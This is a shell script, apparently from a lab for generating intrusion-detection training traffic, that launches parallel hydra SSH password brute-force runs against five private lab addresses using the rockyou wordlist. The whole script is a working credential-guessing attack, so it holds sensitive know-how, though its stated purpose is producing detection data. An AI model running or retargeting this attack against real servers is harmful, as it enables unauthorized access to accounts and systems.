#!/bin/sh
# ssh_bruteforce.sh — SSH brute-force against all victim nodes.
# Generates SSH-Patator-style flows: many short TCP connections, psh_flag_ratio > 0.
# SSH is on port 22 in victim_node (standard sshd).
# All 5 nodes targeted in parallel — realistic credential-harvesting campaign.
#
# timeout 180: rockyou.txt has ~14M entries; full exhaustion against real sshd
# (which does a complete handshake per attempt) would take hours. 180s generates
# ~300-600 attempts per node — more than enough for anomaly detection signal.
PORT=${1:-22}
WORDLIST=${2:-/usr/share/wordlists/rockyou.txt}
USER=${3:-testuser}
DURATION=${4:-180}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] SSH brute-force -> all nodes  $USER:$PORT  duration:${DURATION}s"
for ip in $VICTIMS; do
    timeout "$DURATION" hydra -l "$USER" -P "$WORDLIST" -s "$PORT" -t 4 ssh://"$ip" &
done
wait
